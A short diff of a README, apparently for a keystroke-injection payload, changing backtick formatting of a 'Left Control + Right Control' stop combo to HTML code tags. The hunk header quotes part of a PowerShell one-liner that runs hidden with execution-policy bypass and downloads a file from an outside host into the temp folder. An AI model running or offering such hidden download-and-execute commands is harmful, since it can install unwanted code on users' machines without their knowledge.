@@ -48,7 +48,7 @@ powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol
 
 This payload will automatically end after 2 min 
 
-Or if you press `Left Control` + `Right Control` at the same time
+Or if you press <code>Left Control</code> + <code>Right Control</code> at the same time
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
